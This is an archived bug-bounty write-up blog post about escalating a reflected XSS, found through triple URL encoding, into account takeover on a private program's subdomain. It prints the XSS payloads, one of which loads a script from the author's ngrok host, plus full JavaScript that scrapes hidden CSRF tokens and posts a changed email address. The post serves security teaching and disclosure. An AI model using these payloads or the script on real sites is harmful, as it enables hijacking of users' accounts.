---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-22_escalating-xss-to-account-takeover.md
original_filename: 2020-11-22_escalating-xss-to-account-takeover.md
title: Escalating XSS to Account Takeover
category: documents
detected_topics:
- xss
- command-injection
- otp
- automation-abuse
- csrf
- api-security
tags:
- imported
- documents
- xss
- command-injection
- otp
- automation-abuse
- csrf
- api-security
language: en
raw_sha256: 58ab976056905f6f4fa374cdea1f5ef584784b35c35ade873c6ee936cd066e16
text_sha256: 91aba102e96ea123e791c3e6c249e24d5e2aead8bdb715d39458eb126cd19664
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Escalating XSS to Account Takeover

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-22_escalating-xss-to-account-takeover.md
- Source Type: markdown
- Detected Topics: xss, command-injection, otp, automation-abuse, csrf, api-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `58ab976056905f6f4fa374cdea1f5ef584784b35c35ade873c6ee936cd066e16`
- Text SHA256: `91aba102e96ea123e791c3e6c249e24d5e2aead8bdb715d39458eb126cd19664`


## Content

---
title: "Escalating XSS to Account Takeover"
url: "https://cirius.medium.com/escalating-xss-to-account-takeover-ffde08624937"
authors: ["Aditya Verma (@0cirius0)"]
bugs: ["Reflected XSS", "Account takeover"]
publication_date: "2020-11-22"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4112
scraped_via: "browseros"
---

# Escalating XSS to Account Takeover

Escalating XSS to Account Takeover
Aditya Verma
Follow
4 min read
·
Nov 22, 2020

259

Hey guys, this writeup is about my first Reflected XSS and how I escalated it to account takeover.

I read many Bug Hunters implying on the fact that don’t submit a simple XSS, try to escalate it. I also would tell you to escalate as much as you can, if you give them a XSS and tell what a person can do with it, it does not shows the amount of impact as you would be able to show when you prove with how it would be done; this will increase the severity as well as your payout.

So, I was hunting on a subdomain of a private program say sub.example.com, I had been looking over this subdomain for few days and had understood almost every thing about how the things are working and what a simple person(normal account) can do.Now, I started looking for other files (which are directly not linked)in various directories of the site by directory and files fuzzing using FFUF. I found a file that looked interesting as it was a page to register (let’s name it sub.example.com/fakepath/register) and the main page that opened when someone clicked for registration was sub.example.com/fakepath/registration.

Now this felt like maybe this page was used earlier and then they changed things.So, as you must know that old and forgotten pages have more chances of bugs.

I ran Arjun to check for any hidden parameters and luckily found a few parameters that were being reflected back on the page.Out of those parameters 2 of them were filling in the input fields of the registration form.I send the request with first parameter and it filled the value supplied thorugh URL into the city input field.Sent the request to Burpsuite Repeater and tried basic XSS inputs.Sadly, it got html encoded ; I tried single URL encoding and double URL encoding, none worked and which made me move on to check other paratmeters.

After trying almost every parameter recieved from Arjun I came back to the repeater tab of the earlier one, and just randomly gave another try with Triple URL encoding and guess what the quote(“) character passed on.

Made a simple payload to check sub.example.com/fakepath/register?i=aditya%252522+onmouseover=alert(1)+x=%252522s. I added x parameter at last to balance the quote that is being added by system. Hovered on city input field and it popped out. I checked on other parameter that was being reflected in another input field and it was also vulnerable to similar payload.I also noticed that the registration and register page are almost similar and gave a try on registration and yes both parameters were vulnerable at that page also.

Reported the Bug as medium severity and came back. Now, got the thought that try to escalate it as other people say.I was at first reluctant but since I had already checked for CSRF on various forms like edit account and much I thought since this can execute script why not fetch the account edit page with javascript which will come with CSRF token(in this case tokens) and then send the data back with email changed.

Get Aditya Verma’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

This took some time as I am not much of a developer but short time ago I had done a project with nodeJS. With little earlier familarity and lot googling I somehow put the jigsaw pieces aligned and the script was ready(I created this script on Firefox developer tools; Just incase anyone wanna know how to do it, the console panel allows running of javascript on webpage as it would have come along with the page).Hosted the script locally and used ngrok to create a tunnel to localhost.Used the following payload sub.example.com/fakepath/register?i=aditya%252522+/%25253e%25253cscript+src%3d%252522https://my_ngrok_url/script.js%252522%25253e%25253c/script%25253e

Here is the script:

let name=[];
let value=[];
fetch('https://sub.example.com/fakepath/accountchange.php?update=1')
.then(function(response) {
return response.text()
}).then(function (html) {
// Convert the HTML string into a document object
 var parser = new DOMParser();
 var doc = parser.parseFromString(html, 'text/html');
  //var forms=doc.forms[0];
  //console.log(doc);
  var element = doc.querySelectorAll('input[type="hidden"]');
  //var name=[];
  //var value=[];
  for(var i=0; i<element.length;i++){
  name.push(element[i].name);
  value.push(element[i].value);
  }
  console.log(name,value,"\n");
}).catch(function (err) {
 // There was an error
 console.warn('Something went wrong.', err);
});
//////////////////////////////////////////////////////////////////////
function sendData( data ) {
  const XHR = new XMLHttpRequest(),
  FD  = new FormData();
  console.log(name,value);
  // Push our data into our FormData object
  for(var i=0;i<7;i++) {
  console.log(FD);
  FD.append( name[i],value[i] );
  }
  FD.append('lastname','a');
  FD.append('name',"test");
  FD.append('email','hellrider9+1@wearehackerone.com');
  FD.append('Sumbit','Sumbit');
  // Define what happens on successful data submission
  XHR.addEventListener( 'load', function( event ) {
  alert( 'Yeah! Data sent and response loaded.' );
  } );
// Define what happens in case of error
  XHR.addEventListener(' error', function( event ) {
  alert( 'Oops! Something went wrong.' );
  } );
// Set up our request
  XHR.open( 'POST', 'https://sub.example.com/fakepath/accountchange.php?update=1' );
// Send our FormData object; HTTP headers are set automatically
  XHR.send( FD );
}
setTimeout(sendData,7000);

If anyone wanna understand the code then you can directly contact me through Twitter, my handle is 0cirius0.

Coming back now this Reflected XSS became a high severity Account Takeover.

Takeaway: Escalate, Escalate
